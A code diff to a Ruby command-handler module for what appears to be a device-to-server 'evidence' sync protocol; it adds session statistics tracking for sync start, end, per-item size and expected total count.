@@ -68,11 +68,13 @@ module Commands
 
     # get the time in UTC
     now = Time.now.getutc.to_i
-    
+
+    session[:sync_stat].started
+
     # notify the database that the sync is in progress
     # last parameter is true to trigger the alerts
     DB.instance.sync_start session, version, user_id, device_id, source_id, now
-    
+
     # notify the Evidence Manager that the sync is in progress
     EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
 
@@ -134,9 +136,11 @@ module Commands
   # <- PROTO_OK
   def command_bye(peer, session, message)
 
+    session[:sync_stat].ended
+
     # notify the database that the sync is ended
     DB.instance.sync_end session
-    
+
     # notify the Evidence Manager that the sync has ended
     EvidenceManager.instance.sync_end session
 
@@ -325,6 +329,7 @@ module Commands
 
       # remember how many evidence were transferred in this session
       session[:count] += 1
+      session[:sync_stat].update(size)
 
       total = session[:total] > 0 ? session[:total] : 'unknown'
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]} of #{total}"
@@ -359,6 +364,7 @@ module Commands
 
         # remember how many evidence were transferred in this session
         session[:count] += 1
+        session[:sync_stat].update(size)
 
         total = session[:total] > 0 ? session[:total] : 'unknown'
         trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]} of #{total}"
@@ -385,6 +391,7 @@ module Commands
     # remember how many evidence will be transferred
     session[:count] = 0
     session[:total] = num
+    session[:sync_stat].total = num
 
     # get the size of evidence
     size = message.unpack('Q').first
